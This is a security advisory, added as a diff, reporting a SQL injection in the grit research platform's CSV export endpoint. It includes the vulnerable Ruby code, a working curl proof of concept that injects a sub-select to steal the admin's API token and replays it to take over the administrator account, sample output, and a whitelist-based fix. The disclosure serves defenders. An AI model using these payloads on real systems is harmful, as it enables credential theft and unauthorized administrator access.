@@ -1,0 +1,203 @@
+<div align="center">
+  <a href="https://www.thoropass.com/" target="_blank" rel="noopener noreferrer">
+    <img src="https://github.com/user-attachments/assets/b3bbec80-2537-4578-889e-18eaad0d1194" width="150" alt="Thoropass Logo">
+  </a>
+  <br><br>
+  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
+    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
+  </a>
+  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
+    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
+  </a>
+
+  <h1>SQL Injection in grit42 CSV Export Endpoint</h1>
+
+  <p>🔐 <strong>Thoropass Vulnerability Research Program</strong> 🧪</p>
+</div>
+
+<div align="center">
+<img src="https://img.shields.io/badge/CVE-2026--XXXX-7ED957?style=for-the-badge" alt="Status:Disclosed">
+  <img src="https://img.shields.io/badge/SEVERITY-XXX_0.0-FF4444?style=for-the-badge" alt="Severity: High">
+  <img src="https://img.shields.io/badge/TYPE-SQL Injection-9B59B6?style=for-the-badge" alt="Type: SQL-Injection">
+</div>
+
+
+---
+
+## Advisory Information
+
+| &nbsp; | &nbsp; |
+|:---|:---|
+| **Researcher** | [Natan Morette](https://www.linkedin.com/in/nmmorette/) on behalf of [Thoropass](https://thoropass.com) |
+| **Product** | [grit](https://github.com/grit42/grit) - Open-source scientific research data management platform built by grit42 A/S. The platform stores and visualises data from pre-clinical drug discovery workflows: compounds, batches, assay models, experiment results, and dynamically-typed data tables. |
+| **Affected Version** | 0.0.x through 0.11.0 (every public release; sink introduced in initial commit `79b9dfa`) |
+| **Endpoint** | `GET /api/grit/<engine>/<resource>/export` (any resource declared with `resources_with_export`) |
+| **Vulnerability Type** | CWE-89: SQL Injection |
+| **CVE ID** | *Pending assignment* |
+
+## Vulnerability Summary
+
+The CSV export action in grit's `GritEntityController` splats the user-controlled `params[:columns]` into `Model.unscoped.select(*params[:columns])`, then wraps the resulting relation in a PostgreSQL `COPY (...) TO STDOUT WITH CSV HEADER` statement. Rails' `select` accepts raw SQL fragments, so any authenticated user can inject sub-selects into the SELECT clause and exfiltrate any column the database role can see.
+
+This includes `crypted_password`, `single_access_token`, `forgot_token`, `activation_token`, and `two_factor_token` from `grit_core_users`. Because grit accepts the static `single_access_token` as a permanent `Authorization: Bearer` credential, a leaked admin token converts a zero-role account into a full Administrator in a single HTTP request.
+
+## Technical Analysis
+
+➤ Vulnerable Endpoint: `GET /api/grit/core/origins/export?columns[]=...` (and every sibling resource with `resources_with_export` in routes: `locations`, `countries`, `vocabulary_items`, `units`, `data_types`, `batches`, `synonyms`, `compounds`, `compound_types`, `data_table_rows`, plus the assays `experiments#export`).
+
+➤ Authentication: any active user. No specific role required. The `before_action` chain applies `:require_user` but `:check_read` is restricted to `index` / `show`, so a zero-role user can hit `export` even when blocked from `index`.
+
+### Vulnerable Code
+
+`modules/core/backend/app/controllers/concerns/grit/core/grit_entity_controller.rb`:
+
+```ruby
+def export
+  query = index_entity_for_export(params)
+  return if query.nil?
+
+  if params[:columns]&.length
+    klass = controller_path.classify.constantize
+    query = klass.unscoped.select(*params[:columns]).from(query, :sub)   # <- SQLi sink
+  end
+
+  file = csv_from_query(query)
+  send_data file.read, filename: export_file_name, type: "text/csv"
+end
+
+def csv_from_query(query)
+  csv_sql = "COPY (#{query.to_sql}) TO STDOUT WITH DELIMITER ',' CSV HEADER"
+  ...
+end
+```
+
+`Model.select(string)` is documented to accept raw SQL fragments and intentionally bypasses `disallow_raw_sql!`. Whatever the attacker writes into `columns[]` ends up in the SELECT clause, and `COPY (...) TO STDOUT` streams the resulting rows directly into the HTTP response body.
+
+### Proof of Concept
+#### Prerequisites
+- A running grit instance reachable over HTTP/S.
+- One active user account at the lowest possible privilege level (zero roles is sufficient).
+
+
+**1. Authenticate as any low-privilege user and capture the token.**
+
+```bash
+curl -s -c /tmp/lowpriv -X POST http://localhost:3000/api/grit/core/user_session -H 'Content-Type: application/json' -d '{"user_session":{"login":"low@example.com","password":"LowPriv1!"}}' > /dev/null; set LOWPRIV_TOKEN (curl -s -b /tmp/lowpriv http://localhost:3000/api/grit/core/user_session | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])"); echo "Captured Token: $LOWPRIV_TOKEN"
+```
+![alt text](image.png)
+
+**3. Fire the SQLi to read admin credentials from `grit_core_users`.**
+
+```bash
+curl -G "http://localhost:3000/api/grit/core/origins/export" -H "Authorization: Bearer $LOWPRIV_TOKEN" --dat
+a-urlencode "columns[]=name" --data-urlencode "columns[]=(SELECT single_access_token FROM grit_core_users WHERE 
+login='admin') AS admin_token"
+```
+![alt text](image-1.png)
+
+Server response:
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/csv
+
+Name,Admin token
+ADMIN,GvRUmqQI4jM_gP3NjHTl
+```
+
+The `Token` cell is the admin's permanent `single_access_token`.
+
+**5. Confirm full administrator takeover by replaying the leaked token as a Bearer credential.**
+
+```bash
+curl -H "Authorization: Bearer GvRUmqQI4jM_gP3NjHTl" \
+  "http://localhost:3000/api/grit/core/users?scope=user_administration"
+```
+![alt text](image-2.png)
+
+The response now lists every user including their stored `single_access_token`, `forgot_token`, and `activation_token` values. The attacker has read-write administrator access.
+
+
+## Impact
+
+A remote attacker holding any active grit account can:
+
+- Read every column of every table the database role can see, including hashed passwords (`grit_core_users.crypted_password`), permanent API tokens (`single_access_token`), pending password-reset tokens (`forgot_token`), pending activation tokens (`activation_token`), and second-factor tokens (`two_factor_token`).
+- Replay a leaked admin `single_access_token` as `Authorization: Bearer`, gaining permanent administrator access without needing to touch the password reset or 2FA flows.
+- As administrator, create, modify, or destroy any user, role, vocabulary, compound, batch, assay model, experiment, or attachment on the platform.
+- On the official `grit42com/grit` Docker stack, additionally read arbitrary files inside the database container via `pg_read_file()`, since the bundled DB role retains `SUPERUSER`.
+
+In a multi-tenant CRO deployment of grit, a single role-less account (a scientist's free-tier login) is enough to exfiltrate every project's research data and impersonate the platform administrator.
+
+## Remediation
+
+The minimal fix is to whitelist `params[:columns]` against the model's actual schema and quote the survivors:
+
+```ruby
+def export
+  klass = controller_path.classify.constantize
+  query = index_entity_for_export(params)
+  return if query.nil?
+
+  if params[:columns].is_a?(Array) && params[:columns].any?
+    allowed   = klass.entity_columns.map { |c| c[:name] }.to_set
+    requested = params[:columns].map(&:to_s).select { |c| allowed.include?(c) }
+    quoted    = requested.map { |c| "sub.#{klass.connection.quote_column_name(c)}" }
+    query     = klass.unscoped.select(*quoted).from(query, :sub)
+  end
+
+  file = csv_from_query(query)
+  send_data file.read, filename: export_file_name, type: "text/csv"
+end
+```
+
+
+## References
+
+- Source: https://github.com/grit42/grit
+- Vulnerable controller: https://github.com/grit42/grit/blob/main/modules/core/backend/app/controllers/concerns/grit/core/grit_entity_controller.rb
+- Docker image: https://hub.docker.com/r/grit42com/grit
+- Starter compose: https://github.com/grit42/grit-starter
+- CWE-89: https://cwe.mitre.org/data/definitions/89.html
+- OWASP A03: https://owasp.org/Top10/A03_2021-Injection/
+
+## ⚠️ Disclaimer
+
+The vulnerability was identified through authorized security testing. The proof of concept is provided to help defenders validate their exposure and verify remediation.
+
+Thoropass follows **coordinated vulnerability disclosure (CVD)** principles. Vulnerabilities are reported privately to maintainers, reasonable time is provided for remediation, and public advisories are released after coordination or fix availability.
+
+## About Thoropass
+Thoropass delivers enterprise-grade audits with AI-native speed and precision. Designed from day one to integrate auditors, automation, and infosec workflows in a single, closed-loop system, no add-ons, no handoffs.
+
+Our experienced penetration testing team proactively discovers vulnerabilities in web applications, APIs, and infrastructure — helping organizations secure their systems before attackers find weaknesses.
+
+<div align="center">
+  <br>
+
+  **Thoropass Vulnerability Research Program**
+
+  <em>Improving ecosystem security through responsible research and disclosure.</em>
+
+  <br><br>
+  <a href="https://thoropass.com/contact" target="_blank" rel="noopener noreferrer">
+    <img src="https://img.shields.io/badge/🔒_Request_a_Penetration_Test-Get_Started-7ED957?style=for-the-badge" alt="Request Pentest">
+  </a>
+  <br><br>
+  <a href="https://www.thoropass.com/platform/penetration-testing" target="_blank" rel="noopener noreferrer">
+    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
+  </a>
+  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
+    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
+  </a>
+</div>
+
+---
+
+<div align="center">
+  <br><br>
+  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
+    <img width="100%" alt="Thoropass" src="https://github.com/user-attachments/assets/557c3c6e-bc2d-4b0e-90cb-503767a0aa23">
+  </a>
+</div>
+
